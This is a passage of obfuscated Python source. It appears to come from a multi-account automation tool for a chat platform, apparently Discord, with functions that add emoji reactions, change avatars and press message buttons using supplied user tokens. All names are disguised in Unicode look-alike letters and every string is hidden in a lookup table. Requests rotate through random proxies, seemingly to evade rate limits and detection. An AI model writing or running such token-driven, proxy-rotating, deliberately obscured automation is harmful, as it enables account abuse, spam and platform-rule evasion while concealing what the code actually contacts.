    𝗺𝙚𝙨𝘀𝙖𝗴𝘦_𝗶𝗱 = 𝗺𝙚𝘴𝘀𝗮𝙜𝘦_𝙡𝙞𝘯𝙠.split(𝘐𝙉𝘐𝗡𝘭𝗹𝗜𝙈𝘐𝙄𝘭𝙈𝗹𝘭𝙄𝗹𝙡𝙉𝗡𝙄𝘭𝗹𝙈𝘕𝗹𝘕𝘭𝙈𝗜𝘔𝘐𝗠[315])[6]
    if 𝘱𝙧𝙤𝘹𝘆:
        𝘳𝗿 = 𝘳𝘦𝗾𝘂𝘦𝘀𝙩𝘴.put(f'{𝘐𝙉𝗜𝗡𝗹𝙡𝗜𝙈𝙄𝘐𝙡𝘔𝙡𝘭𝘐𝘭𝘭𝙉𝗡𝘐𝗹𝗹𝙈𝗡𝙡𝗡𝗹𝘔𝙄𝙈𝗜𝙈[266]}{𝗰𝗵𝗮𝘯𝙣𝘦𝘭_𝙞𝙙}{𝘐𝗡𝙄𝗡𝗹𝗹𝙄𝘔𝘐𝗜𝗹𝘔𝙡𝘭𝗜𝗹𝙡𝗡𝙉𝙄𝙡𝘭𝙈𝘕𝗹𝙉𝙡𝙈𝗜𝘔𝘐𝘔[316]}{𝗺𝗲𝘀𝘀𝙖𝙜𝙚_𝙞𝘥}{𝙄𝗡𝙄𝗡𝙡𝗹𝗜𝘔𝘐𝗜𝗹𝙈𝘭𝙡𝙄𝘭𝘭𝘕𝙉𝘐𝙡𝙡𝗠𝙉𝘭𝘕𝙡𝗠𝘐𝘔𝘐𝘔[317]}{𝘦𝗺𝙤𝗷𝗶}{𝗜𝘕𝙄𝙉𝙡𝙡𝗜𝗠𝘐𝘐𝘭𝗠𝙡𝘭𝙄𝗹𝙡𝙉𝗡𝗜𝗹𝙡𝗠𝙉𝙡𝘕𝘭𝗠𝘐𝙈𝗜𝗠[318]}', headers=𝙝𝘦𝘢𝙙𝙚𝘳𝙨, json={}, proxy={𝘐𝘕𝗜𝗡𝘭𝗹𝙄𝘔𝗜𝘐𝗹𝗠𝗹𝘭𝘐𝗹𝗹𝙉𝘕𝗜𝘭𝘭𝙈𝙉𝘭𝘕𝗹𝗠𝘐𝙈𝘐𝙈[244]: 𝘐𝙉𝗜𝙉𝘭𝗹𝗜𝘔𝘐𝙄𝙡𝗠𝙡𝙡𝘐𝘭𝙡𝙉𝙉𝙄𝗹𝘭𝘔𝙉𝘭𝙉𝘭𝗠𝗜𝗠𝘐𝙈[246] + 𝘳𝗮𝙣𝗱𝘰𝘮.choice(𝙥𝗿𝙤𝘹𝙞𝘦𝘀), 𝘐𝘕𝘐𝗡𝙡𝙡𝗜𝘔𝗜𝙄𝘭𝙈𝙡𝙡𝘐𝙡𝘭𝘕𝗡𝘐𝙡𝗹𝘔𝘕𝘭𝘕𝙡𝙈𝘐𝘔𝙄𝘔[245]: 𝘐𝗡𝙄𝙉𝗹𝗹𝙄𝙈𝙄𝗜𝙡𝗠𝘭𝘭𝙄𝗹𝗹𝙉𝘕𝙄𝗹𝗹𝙈𝙉𝘭𝗡𝘭𝘔𝘐𝘔𝘐𝘔[246] + 𝙧𝘢𝘯𝗱𝗼𝙢.choice(𝗽𝗿𝘰𝙭𝘪𝙚𝘀)})
    else:
        𝗿𝙧 = 𝗿𝘦𝙦𝘂𝗲𝙨𝘁𝙨.put(f'{𝙄𝙉𝙄𝗡𝙡𝙡𝗜𝘔𝙄𝘐𝗹𝗠𝘭𝘭𝙄𝘭𝗹𝗡𝗡𝘐𝙡𝗹𝘔𝘕𝘭𝙉𝗹𝘔𝙄𝙈𝗜𝗠[266]}{𝘤𝘩𝗮𝙣𝗻𝘦𝘭_𝙞𝗱}{𝗜𝘕𝗜𝙉𝙡𝗹𝗜𝗠𝗜𝙄𝙡𝗠𝗹𝙡𝘐𝙡𝙡𝗡𝘕𝙄𝗹𝗹𝙈𝘕𝘭𝗡𝗹𝘔𝘐𝘔𝙄𝗠[316]}{𝗺𝗲𝘀𝘀𝙖𝗴𝗲_𝙞𝙙}{𝘐𝘕𝗜𝙉𝙡𝘭𝗜𝙈𝙄𝘐𝗹𝗠𝘭𝘭𝘐𝘭𝙡𝙉𝘕𝙄𝗹𝘭𝙈𝗡𝙡𝘕𝘭𝙈𝗜𝙈𝙄𝙈[317]}{𝘦𝙢𝙤𝙟𝙞}{𝙄𝗡𝗜𝘕𝗹𝗹𝗜𝗠𝙄𝘐𝙡𝗠𝘭𝙡𝙄𝗹𝙡𝘕𝙉𝘐𝘭𝗹𝙈𝘕𝙡𝗡𝙡𝗠𝗜𝗠𝘐𝙈[318]}', headers=𝘩𝙚𝘢𝙙𝘦𝙧𝘴, json={})
    𝙙𝘯 = 𝙩𝗼𝘬𝘦𝘯.split(𝗜𝙉𝗜𝗡𝗹𝘭𝗜𝗠𝙄𝗜𝙡𝙈𝙡𝘭𝙄𝙡𝗹𝙉𝙉𝘐𝗹𝘭𝗠𝘕𝙡𝙉𝗹𝗠𝘐𝗠𝙄𝘔[247])
    𝗻𝗻 = 𝗱𝗻[0]
    if 𝘳𝗿.status_code == 204:
        𝙥𝗿𝗶𝘯𝘁(f"{𝙧}{𝙄𝙉𝘐𝘕𝙡𝗹𝘐𝘔𝙄𝘐𝘭𝗠𝘭𝘭𝗜𝗹𝘭𝙉𝙉𝙄𝘭𝗹𝙈𝙉𝗹𝘕𝘭𝘔𝗜𝘔𝗜𝙈[91]}{𝙙𝙖𝙩𝘦𝙩𝗶𝙢𝙚.datetime.now().strftime(f'{𝗴}{𝘐𝘕𝙄𝙉𝙡𝗹𝙄𝙈𝘐𝗜𝗹𝘔𝙡𝗹𝘐𝙡𝘭𝗡𝗡𝘐𝘭𝘭𝘔𝙉𝗹𝘕𝙡𝙈𝘐𝙈𝙄𝙈[92]}{𝗿}')}{𝘐𝘕𝙄𝗡𝗹𝗹𝗜𝘔𝙄𝘐𝗹𝗠𝙡𝙡𝗜𝙡𝗹𝙉𝙉𝘐𝘭𝘭𝗠𝘕𝗹𝘕𝘭𝘔𝙄𝘔𝘐𝗠[93]}{𝗿}{𝙄𝗡𝙄𝘕𝘭𝘭𝙄𝙈𝘐𝘐𝙡𝘔𝗹𝘭𝘐𝙡𝙡𝘕𝘕𝘐𝙡𝘭𝗠𝘕𝗹𝗡𝗹𝘔𝙄𝙈𝘐𝗠[91]}{𝘭𝙘}{𝗜𝗡𝗜𝗡𝙡𝘭𝘐𝙈𝘐𝗜𝗹𝙈𝙡𝙡𝙄𝘭𝘭𝗡𝙉𝙄𝘭𝗹𝘔𝗡𝗹𝗡𝗹𝙈𝗜𝗠𝗜𝙈[319]}{𝗿}{𝘐𝙉𝗜𝙉𝗹𝘭𝗜𝙈𝙄𝗜𝙡𝘔𝘭𝙡𝗜𝗹𝙡𝘕𝗡𝗜𝘭𝘭𝗠𝙉𝘭𝙉𝗹𝗠𝙄𝙈𝗜𝗠[93]}{𝗻𝗻}{𝙜}{𝘐𝘕𝙄𝘕𝘭𝙡𝘐𝙈𝘐𝗜𝙡𝙈𝗹𝗹𝙄𝘭𝙡𝗡𝘕𝙄𝙡𝙡𝗠𝘕𝙡𝘕𝙡𝘔𝗜𝙈𝗜𝙈[270]}{𝘳𝘳.text}")
    else:
        𝗽𝗿𝗶𝘯𝘁(f"{𝘳}{𝘐𝘕𝗜𝗡𝗹𝘭𝘐𝘔𝙄𝘐𝘭𝘔𝙡𝘭𝗜𝙡𝘭𝗡𝘕𝘐𝙡𝘭𝗠𝙉𝘭𝘕𝘭𝙈𝘐𝗠𝘐𝗠[91]}{𝗱𝙖𝘵𝘦𝘵𝘪𝘮𝘦.datetime.now().strftime(f'{𝙜}{𝙄𝗡𝘐𝙉𝗹𝘭𝘐𝘔𝘐𝙄𝗹𝘔𝙡𝙡𝘐𝙡𝘭𝗡𝗡𝗜𝗹𝘭𝗠𝙉𝗹𝘕𝗹𝘔𝙄𝘔𝗜𝙈[92]}{𝗿}')}{𝗜𝗡𝘐𝘕𝗹𝘭𝗜𝙈𝘐𝙄𝗹𝙈𝙡𝙡𝘐𝗹𝙡𝙉𝗡𝘐𝙡𝗹𝘔𝗡𝙡𝙉𝗹𝗠𝘐𝙈𝗜𝘔[93]}{𝘳}{𝙄𝘕𝙄𝘕𝘭𝗹𝗜𝗠𝗜𝘐𝗹𝙈𝙡𝙡𝙄𝘭𝘭𝘕𝙉𝙄𝗹𝗹𝘔𝗡𝘭𝘕𝙡𝗠𝙄𝗠𝗜𝗠[91]}{𝘣}{𝘐𝘕𝗜𝘕𝘭𝘭𝘐𝘔𝙄𝙄𝘭𝘔𝙡𝗹𝘐𝘭𝗹𝘕𝘕𝗜𝙡𝗹𝙈𝙉𝗹𝙉𝙡𝗠𝘐𝗠𝘐𝗠[314]}{𝗿}{𝗜𝙉𝙄𝙉𝗹𝙡𝙄𝙈𝘐𝘐𝘭𝘔𝘭𝗹𝘐𝘭𝙡𝙉𝗡𝗜𝘭𝗹𝘔𝗡𝙡𝙉𝗹𝗠𝗜𝙈𝘐𝙈[93]}{𝗻𝗻}{𝗴}{𝗜𝘕𝘐𝘕𝙡𝗹𝘐𝙈𝘐𝙄𝗹𝙈𝗹𝘭𝗜𝘭𝙡𝙉𝗡𝗜𝙡𝙡𝙈𝙉𝗹𝗡𝙡𝙈𝘐𝙈𝗜𝘔[270]}{𝙧𝙧.text}")

def avatar_changer(token):
    𝙙𝙣 = 𝙩𝙤𝙠𝗲𝙣.split(𝘐𝘕𝗜𝘕𝘭𝗹𝙄𝘔𝗜𝗜𝘭𝘔𝙡𝘭𝘐𝘭𝙡𝘕𝘕𝙄𝗹𝙡𝙈𝗡𝘭𝘕𝗹𝗠𝙄𝗠𝗜𝙈[247])
    𝙣𝙣 = 𝗱𝘯[0]
    𝗵𝘦𝗮𝗱𝙚𝘳𝙨 = {𝗜𝙉𝘐𝗡𝗹𝘭𝗜𝗠𝗜𝗜𝗹𝗠𝗹𝘭𝗜𝙡𝙡𝘕𝙉𝙄𝗹𝙡𝗠𝗡𝙡𝙉𝘭𝙈𝘐𝗠𝗜𝙈[130]: 𝙩𝙤𝘬𝗲𝘯}
    𝘱𝗶𝙘𝙩𝙪𝘳𝙚 = [𝙛 for 𝗳 in 𝘰𝘴.listdir(𝘐𝘕𝗜𝗡𝘭𝗹𝙄𝗠𝘐𝗜𝙡𝙈𝗹𝗹𝘐𝙡𝙡𝙉𝘕𝘐𝗹𝗹𝙈𝘕𝙡𝘕𝗹𝘔𝙄𝙈𝙄𝙈[320]) if 𝘪𝘀𝙛𝙞𝙡𝙚(𝗷𝘰𝙞𝘯(𝙄𝙉𝘐𝘕𝙡𝙡𝗜𝙈𝙄𝙄𝘭𝗠𝙡𝘭𝙄𝗹𝗹𝘕𝗡𝗜𝘭𝙡𝗠𝘕𝙡𝙉𝙡𝘔𝘐𝙈𝗜𝗠[320], 𝗳))]
    𝙧𝗮𝗻𝗱𝙤𝘮_𝘱𝙞𝗰𝘵𝘶𝘳𝗲 = 𝗿𝙖𝗻𝙙𝘰𝘮.choice(𝘱𝘪𝗰𝙩𝙪𝘳𝙚)
    with 𝙤𝗽𝗲𝙣(f'{𝗜𝙉𝙄𝗡𝗹𝘭𝗜𝘔𝘐𝘐𝙡𝗠𝗹𝘭𝙄𝗹𝘭𝘕𝙉𝘐𝘭𝘭𝘔𝘕𝗹𝗡𝗹𝙈𝗜𝗠𝙄𝗠[320]}{𝙧𝘢𝗻𝘥𝙤𝗺_𝘱𝙞𝙘𝙩𝙪𝙧𝗲}', 𝙄𝙉𝙄𝙉𝘭𝘭𝘐𝗠𝗜𝘐𝗹𝘔𝘭𝙡𝙄𝘭𝘭𝘕𝙉𝙄𝘭𝘭𝙈𝗡𝘭𝙉𝗹𝘔𝙄𝗠𝘐𝙈[321]) as 𝘧:
        𝗲𝗻𝙘𝙤𝗱𝗲𝙙_𝘀𝙩𝗿𝗶𝗻𝗴 = 𝗯𝗮𝘴𝗲64.b64encode(𝘧.read())
    𝙥𝙖𝙮𝙡𝙤𝗮𝙙 = {𝗜𝗡𝙄𝗡𝙡𝗹𝙄𝘔𝗜𝗜𝙡𝗠𝙡𝗹𝙄𝘭𝙡𝘕𝙉𝙄𝘭𝗹𝘔𝗡𝗹𝗡𝙡𝙈𝘐𝗠𝘐𝙈[322]: f'{𝙄𝘕𝗜𝘕𝗹𝙡𝙄𝙈𝗜𝗜𝗹𝗠𝘭𝘭𝙄𝙡𝙡𝙉𝘕𝙄𝗹𝙡𝘔𝙉𝘭𝘕𝙡𝙈𝗜𝙈𝘐𝗠[323]}{𝙚𝗻𝙘𝙤𝙙𝗲𝙙_𝘴𝘁𝙧𝗶𝙣𝗴.decode(𝘐𝙉𝘐𝘕𝘭𝘭𝗜𝘔𝙄𝙄𝘭𝘔𝙡𝙡𝗜𝗹𝙡𝗡𝗡𝙄𝗹𝙡𝗠𝙉𝘭𝘕𝘭𝘔𝙄𝘔𝗜𝘔[324])}'}
    if 𝙥𝙧𝘰𝘹𝙮:
        𝙧𝙧 = 𝗿𝙚𝗾𝘶𝙚𝙨𝘁𝘴.patch(f'{𝙄𝙉𝙄𝘕𝙡𝙡𝘐𝘔𝙄𝙄𝘭𝙈𝙡𝙡𝗜𝘭𝙡𝙉𝗡𝘐𝙡𝘭𝘔𝙉𝙡𝘕𝙡𝘔𝙄𝙈𝙄𝘔[325]}', headers=𝙝𝘦𝙖𝘥𝘦𝗿𝙨, json=𝗽𝗮𝘺𝙡𝙤𝙖𝙙, proxy={𝙄𝙉𝙄𝗡𝙡𝗹𝙄𝗠𝘐𝙄𝘭𝘔𝙡𝙡𝘐𝗹𝘭𝙉𝗡𝘐𝘭𝙡𝙈𝘕𝘭𝗡𝗹𝙈𝗜𝗠𝙄𝗠[244]: 𝙄𝙉𝘐𝙉𝗹𝘭𝙄𝗠𝗜𝘐𝙡𝙈𝘭𝘭𝗜𝗹𝙡𝘕𝙉𝗜𝙡𝙡𝗠𝙉𝗹𝗡𝘭𝗠𝙄𝘔𝘐𝗠[246] + 𝘳𝗮𝙣𝗱𝙤𝙢.choice(𝙥𝙧𝘰𝘅𝙞𝙚𝘀), 𝙄𝙉𝗜𝗡𝗹𝙡𝘐𝘔𝗜𝙄𝙡𝙈𝘭𝙡𝗜𝙡𝗹𝗡𝙉𝘐𝘭𝘭𝗠𝗡𝗹𝘕𝘭𝙈𝗜𝙈𝙄𝙈[245]: 𝙄𝗡𝘐𝘕𝙡𝗹𝘐𝘔𝘐𝘐𝘭𝙈𝘭𝘭𝗜𝘭𝗹𝙉𝗡𝘐𝙡𝗹𝙈𝘕𝘭𝙉𝘭𝗠𝗜𝘔𝙄𝗠[246] + 𝗿𝗮𝙣𝘥𝙤𝙢.choice(𝗽𝙧𝙤𝘹𝙞𝗲𝙨)})
    else:
        𝗿𝘳 = 𝗿𝗲𝗾𝘶𝙚𝙨𝙩𝙨.patch(f'{𝘐𝙉𝙄𝘕𝗹𝙡𝙄𝘔𝙄𝘐𝗹𝘔𝘭𝘭𝙄𝘭𝘭𝗡𝘕𝘐𝙡𝘭𝙈𝘕𝗹𝗡𝗹𝗠𝘐𝙈𝗜𝘔[325]}', headers=𝗵𝘦𝙖𝘥𝙚𝗿𝙨, json=𝙥𝗮𝘆𝘭𝘰𝘢𝗱)
    if 𝘳𝗿.status_code == 200:
        𝘱𝙧𝙞𝙣𝘁(f"{𝘳}{𝙄𝗡𝙄𝗡𝙡𝘭𝘐𝗠𝗜𝙄𝗹𝘔𝗹𝗹𝙄𝗹𝘭𝘕𝗡𝘐𝙡𝙡𝙈𝘕𝗹𝘕𝗹𝙈𝘐𝘔𝙄𝙈[91]}{𝗱𝘢𝘵𝘦𝘁𝘪𝘮𝙚.datetime.now().strftime(f'{𝘨}{𝙄𝗡𝙄𝗡𝗹𝗹𝗜𝗠𝙄𝙄𝗹𝙈𝗹𝙡𝙄𝗹𝗹𝘕𝘕𝙄𝙡𝗹𝘔𝙉𝘭𝗡𝘭𝘔𝙄𝙈𝘐𝙈[92]}{𝗿}')}{𝙄𝙉𝙄𝙉𝗹𝗹𝗜𝙈𝘐𝘐𝙡𝙈𝗹𝙡𝙄𝘭𝗹𝙉𝘕𝙄𝘭𝗹𝙈𝙉𝙡𝙉𝘭𝙈𝘐𝘔𝘐𝘔[93]}{𝘳}{𝗜𝙉𝙄𝗡𝘭𝗹𝙄𝘔𝙄𝘐𝘭𝙈𝙡𝗹𝗜𝘭𝘭𝗡𝗡𝙄𝘭𝘭𝙈𝘕𝙡𝗡𝗹𝗠𝘐𝙈𝗜𝙈[91]}{𝗹𝘤}{𝘐𝗡𝗜𝘕𝗹𝙡𝙄𝘔𝗜𝘐𝘭𝙈𝗹𝘭𝙄𝗹𝗹𝘕𝗡𝙄𝗹𝙡𝗠𝙉𝗹𝗡𝘭𝘔𝗜𝗠𝘐𝘔[301]}{𝗿}{𝙄𝗡𝗜𝙉𝙡𝙡𝙄𝘔𝘐𝙄𝗹𝗠𝙡𝙡𝗜𝙡𝗹𝘕𝘕𝘐𝙡𝘭𝗠𝙉𝙡𝗡𝗹𝗠𝘐𝘔𝗜𝙈[93]}{𝙣𝘯}{𝙜}{𝙄𝘕𝙄𝙉𝗹𝙡𝘐𝘔𝗜𝗜𝘭𝙈𝙡𝙡𝘐𝗹𝗹𝘕𝘕𝗜𝗹𝙡𝙈𝘕𝘭𝙉𝙡𝙈𝙄𝙈𝙄𝙈[249]}")
    else:
        𝗽𝙧𝙞𝗻𝘁(f"{𝘳}{𝙄𝘕𝘐𝙉𝗹𝗹𝗜𝙈𝗜𝘐𝗹𝙈𝘭𝙡𝘐𝘭𝗹𝙉𝗡𝘐𝙡𝙡𝘔𝗡𝘭𝘕𝙡𝘔𝗜𝘔𝙄𝙈[91]}{𝘥𝙖𝘁𝗲𝘵𝙞𝘮𝘦.datetime.now().strftime(f'{𝗴}{𝗜𝗡𝗜𝘕𝙡𝗹𝘐𝗠𝙄𝘐𝗹𝗠𝗹𝙡𝘐𝘭𝙡𝗡𝗡𝗜𝗹𝘭𝙈𝘕𝘭𝙉𝘭𝙈𝗜𝗠𝘐𝙈[92]}{𝘳}')}{𝙄𝘕𝘐𝙉𝗹𝙡𝙄𝘔𝗜𝙄𝙡𝘔𝘭𝙡𝘐𝗹𝙡𝗡𝘕𝗜𝙡𝗹𝘔𝘕𝘭𝗡𝙡𝘔𝘐𝘔𝘐𝙈[93]}{𝙧}{𝙄𝙉𝙄𝘕𝗹𝗹𝘐𝗠𝗜𝗜𝗹𝗠𝙡𝘭𝙄𝙡𝗹𝗡𝗡𝗜𝗹𝗹𝘔𝙉𝙡𝘕𝘭𝙈𝙄𝙈𝘐𝙈[91]}{𝙗}{𝙄𝗡𝘐𝘕𝙡𝗹𝘐𝗠𝘐𝙄𝘭𝙈𝙡𝘭𝙄𝘭𝙡𝘕𝘕𝗜𝙡𝗹𝘔𝙉𝙡𝗡𝘭𝙈𝗜𝘔𝗜𝗠[269]}{𝗿}{𝙄𝘕𝘐𝘕𝗹𝙡𝘐𝗠𝙄𝙄𝙡𝗠𝘭𝙡𝘐𝗹𝙡𝘕𝗡𝘐𝙡𝙡𝘔𝗡𝘭𝗡𝗹𝗠𝗜𝙈𝗜𝗠[93]}{𝗻𝙣}{𝙜}{𝗜𝘕𝘐𝘕𝗹𝘭𝙄𝙈𝘐𝘐𝙡𝗠𝙡𝗹𝙄𝙡𝘭𝙉𝘕𝗜𝗹𝗹𝙈𝙉𝙡𝘕𝗹𝙈𝗜𝙈𝘐𝗠[270]}{𝘳𝗿.text}")

def button_bypass(token, message_link, optionbutton):
    𝘥𝙣 = 𝙩𝙤𝙠𝘦𝘯.split(𝘐𝘕𝗜𝗡𝗹𝘭𝘐𝙈𝘐𝙄𝘭𝙈𝙡𝘭𝘐𝘭𝘭𝗡𝘕𝘐𝘭𝗹𝘔𝙉𝘭𝘕𝘭𝘔𝙄𝗠𝙄𝙈[247])
    𝙣𝘯 = 𝗱𝗻[0]
    𝗵𝙚𝘢𝗱𝗲𝘳𝘀 = 𝗛𝘦𝗮𝗱𝙚𝘳𝘀(𝘵𝘰𝙠𝙚𝗻)
    try:
        𝗴𝘂𝘪𝙡𝘥_𝘪𝘥 = 𝘮𝙚𝙨𝘀𝗮𝙜𝙚_𝘭𝗶𝙣𝙠.split(𝙄𝘕𝗜𝙉𝙡𝘭𝘐𝗠𝙄𝙄𝘭𝙈𝙡𝙡𝘐𝙡𝗹𝙉𝘕𝘐𝗹𝗹𝗠𝘕𝗹𝙉𝙡𝙈𝘐𝗠𝙄𝗠[315])[4]
        𝗰𝘩𝙖𝗻𝘯𝙚𝘭_𝙞𝗱 = 𝙢𝗲𝘀𝙨𝙖𝘨𝗲_𝘭𝙞𝗻𝙠.split(𝘐𝘕𝙄𝗡𝗹𝙡𝘐𝗠𝘐𝘐𝘭𝘔𝗹𝙡𝘐𝗹𝘭𝙉𝗡𝗜𝗹𝘭𝗠𝗡𝗹𝙉𝙡𝗠𝙄𝙈𝙄𝗠[315])[5]
        𝗺𝙚𝘀𝙨𝙖𝙜𝘦_𝘪𝘥 = 𝘮𝗲𝘀𝘀𝙖𝗴𝗲_𝙡𝘪𝙣𝙠.split(𝗜𝘕𝗜𝙉𝗹𝘭𝘐𝘔𝘐𝗜𝘭𝙈𝗹𝙡𝘐𝗹𝘭𝗡𝗡𝙄𝘭𝘭𝙈𝙉𝗹𝙉𝗹𝘔𝙄𝗠𝗜𝘔[315])[6]
        𝘱𝗮𝙮𝙡𝘰𝘢𝘥 = {𝙄𝘕𝘐𝘕𝙡𝗹𝘐𝗠𝙄𝘐𝙡𝗠𝗹𝘭𝗜𝗹𝙡𝙉𝘕𝗜𝘭𝘭𝙈𝘕𝘭𝗡𝙡𝗠𝙄𝙈𝘐𝙈[326]: 𝙄𝙉𝗜𝘕𝗹𝗹𝙄𝙈𝗜𝘐𝗹𝘔𝙡𝘭𝙄𝙡𝙡𝘕𝗡𝙄𝗹𝘭𝘔𝘕𝗹𝙉𝙡𝘔𝗜𝗠𝗜𝙈[328], 𝘐𝙉𝗜𝙉𝙡𝙡𝘐𝙈𝘐𝙄𝗹𝗠𝙡𝗹𝗜𝗹𝗹𝘕𝘕𝙄𝘭𝘭𝗠𝙉𝗹𝙉𝙡𝙈𝗜𝗠𝙄𝘔[327]: 𝗺𝙚𝙨𝙨𝙖𝘨𝙚_𝘪𝘥}
        if 𝙥𝙧𝗼𝙭𝘆:
            𝘳𝘳 = 𝗿𝘦𝙦𝙪𝘦𝘴𝘁𝘀.get(𝙄𝘕𝗜𝘕𝗹𝙡𝗜𝘔𝗜𝙄𝗹𝙈𝗹𝗹𝘐𝘭𝘭𝙉𝘕𝗜𝘭𝗹𝙈𝙉𝗹𝗡𝙡𝙈𝗜𝗠𝙄𝘔[266] + 𝘤𝘩𝘢𝙣𝗻𝗲𝙡_𝘪𝘥 + 𝙄𝘕𝙄𝗡𝗹𝗹𝙄𝗠𝗜𝘐𝗹𝘔𝘭𝙡𝙄𝙡𝙡𝙉𝗡𝙄𝗹𝗹𝙈𝙉𝙡𝘕𝙡𝗠𝙄𝘔𝘐𝙈[267], params=𝘱𝘢𝙮𝙡𝗼𝙖𝘥, headers=𝘩𝘦𝗮𝙙𝘦𝘳𝙨, proxy={𝙄𝙉𝙄𝘕𝙡𝘭𝘐𝘔𝙄𝙄𝗹𝙈𝙡𝘭𝗜𝙡𝗹𝗡𝘕𝘐𝘭𝘭𝗠𝘕𝙡𝙉𝘭𝘔𝗜𝗠𝙄𝙈[244]: 𝗜𝘕𝗜𝗡𝗹𝙡𝗜𝙈𝙄𝙄𝙡𝘔𝘭𝗹𝙄𝙡𝙡𝙉𝗡𝗜𝘭𝗹𝙈𝘕𝗹𝗡𝘭𝘔𝗜𝘔𝗜𝗠[246] + 𝗿𝙖𝙣𝙙𝘰𝘮.choice(𝙥𝙧𝗼𝘅𝘪𝘦𝘀), 𝘐𝙉𝗜𝗡𝙡𝗹𝗜𝗠𝘐𝙄𝙡𝘔𝙡𝙡𝙄𝙡𝗹𝗡𝙉𝘐𝙡𝗹𝗠𝘕𝙡𝙉𝗹𝙈𝘐𝗠𝘐𝗠[245]: 𝘐𝗡𝘐𝙉𝙡𝗹𝘐𝙈𝗜𝘐𝗹𝗠𝙡𝘭𝗜𝙡𝙡𝘕𝗡𝗜𝘭𝗹𝙈𝘕𝗹𝗡𝙡𝗠𝘐𝗠𝗜𝘔[246] + 𝘳𝙖𝗻𝗱𝘰𝙢.choice(𝙥𝙧𝘰𝘅𝗶𝘦𝘴)})
        else:
            𝙧𝗿 = 𝗿𝘦𝙦𝘶𝘦𝙨𝙩𝙨.get(𝘐𝘕𝘐𝘕𝙡𝗹𝘐𝙈𝙄𝙄𝙡𝘔𝗹𝘭𝙄𝗹𝙡𝗡𝘕𝙄𝘭𝘭𝙈𝘕𝘭𝙉𝙡𝘔𝘐𝙈𝗜𝙈[266] + 𝘤𝗵𝗮𝗻𝙣𝙚𝙡_𝗶𝗱 + 𝗜𝙉𝘐𝙉𝗹𝙡𝘐𝙈𝗜𝘐𝗹𝙈𝗹𝘭𝘐𝘭𝘭𝘕𝗡𝙄𝙡𝗹𝗠𝙉𝙡𝗡𝗹𝗠𝙄𝙈𝗜𝘔[267], params=𝙥𝘢𝙮𝘭𝘰𝙖𝙙, headers=𝘩𝙚𝗮𝗱𝗲𝙧𝙨)
        𝗺𝘦𝘀𝙨𝘢𝙜𝗲𝘴 = 𝙧𝘳.json()
        𝙢𝘦𝘴𝙨𝘢𝗴𝘦𝘣𝗼𝘵𝙩𝘰𝗰𝗹𝗶𝙘𝗸 = None
        for 𝘅 in 𝗺𝘦𝙨𝘴𝘢𝙜𝗲𝘀:
            if 𝘹[𝗜𝗡𝘐𝗡𝙡𝘭𝘐𝘔𝙄𝗜𝗹𝗠𝗹𝘭𝙄𝙡𝙡𝘕𝗡𝙄𝙡𝗹𝙈𝗡𝗹𝗡𝙡𝗠𝘐𝘔𝘐𝗠[160]] == 𝙢𝘦𝘀𝘀𝙖𝙜𝗲_𝗶𝘥:
                𝘮𝗲𝘀𝙨𝙖𝗴𝙚𝘣𝙤𝘁𝘵𝘰𝗰𝗹𝙞𝙘𝘬 = 𝙭
        if 𝘮𝗲𝘀𝙨𝗮𝗴𝘦𝗯𝘰𝘁𝘵𝙤𝘤𝙡𝙞𝗰𝘬 == None:
            pass
        𝙗𝙪𝘁𝙩𝗼𝘯𝘀 = []
        𝙡𝙞𝗰𝘻𝘣𝙖 = 0
        for 𝘅 in 𝗺𝙚𝘴𝘴𝗮𝗴𝗲𝘣𝘰𝙩𝙩𝗼𝙘𝗹𝙞𝘤𝗸[𝙄𝗡𝘐𝗡𝙡𝙡𝗜𝘔𝘐𝘐𝗹𝘔𝘭𝘭𝙄𝘭𝙡𝘕𝙉𝘐𝙡𝘭𝙈𝘕𝗹𝗡𝙡𝗠𝘐𝙈𝗜𝘔[329]]:
            𝗽𝗿𝗶𝙣𝘁(f"{𝙧}{𝗜𝘕𝗜𝘕𝗹𝗹𝘐𝘔𝗜𝘐𝙡𝘔𝘭𝘭𝗜𝙡𝘭𝙉𝘕𝗜𝗹𝘭𝘔𝗡𝘭𝙉𝘭𝙈𝗜𝙈𝙄𝗠[91]}{𝙙𝙖𝘵𝘦𝘵𝗶𝙢𝘦.datetime.now().strftime(f'{𝘨}{𝘐𝙉𝗜𝘕𝙡𝗹𝘐𝘔𝘐𝗜𝘭𝗠𝙡𝗹𝗜𝙡𝘭𝙉𝗡𝘐𝘭𝘭𝙈𝘕𝙡𝗡𝘭𝘔𝗜𝘔𝘐𝗠[92]}{𝙧}')}{𝙄𝘕𝗜𝘕𝘭𝗹𝙄𝗠𝙄𝗜𝗹𝙈𝘭𝘭𝙄𝙡𝗹𝗡𝙉𝗜𝗹𝘭𝗠𝗡𝙡𝘕𝗹𝘔𝗜𝙈𝗜𝘔[93]}{𝘳}{𝗜𝘕𝗜𝗡𝙡𝙡𝙄𝘔𝗜𝘐𝙡𝙈𝗹𝘭𝗜𝙡𝙡𝘕𝗡𝗜𝘭𝙡𝙈𝗡𝘭𝗡𝙡𝙈𝗜𝙈𝘐𝘔[91]}{𝗹𝗰}{𝙄𝙉𝘐𝗡𝘭𝙡𝙄𝘔𝘐𝗜𝗹𝘔𝗹𝙡𝙄𝗹𝘭𝙉𝘕𝘐𝙡𝘭𝗠𝗡𝗹𝙉𝘭𝘔𝗜𝙈𝗜𝗠[301]}{𝗿}{𝙄𝘕𝙄𝘕𝗹𝙡𝘐𝗠𝘐𝙄𝘭𝗠𝙡𝙡𝘐𝘭𝙡𝗡𝙉𝙄𝙡𝘭𝗠𝙉𝘭𝗡𝙡𝘔𝙄𝗠𝙄𝙈[93]}{𝙣𝙣}{𝘐𝙉𝘐𝗡𝘭𝘭𝗜𝙈𝘐𝘐𝙡𝙈𝗹𝗹𝗜𝙡𝗹𝙉𝗡𝘐𝗹𝙡𝗠𝗡𝗹𝙉𝘭𝘔𝘐𝙈𝘐𝘔[249]}{𝙜}")
            𝘣𝘂𝘵𝘁𝗼𝗻𝙨.append(𝘅[𝘐𝗡𝘐𝘕𝙡𝘭𝗜𝙈𝘐𝙄𝙡𝙈𝗹𝗹𝗜𝘭𝙡𝘕𝘕𝙄𝗹𝗹𝙈𝗡𝗹𝗡𝙡𝘔𝘐𝙈𝙄𝙈[329]][0])
            𝙡𝗶𝘤𝘻𝙗𝘢 = 𝘭𝗶𝙘𝘇𝗯𝘢 + 1
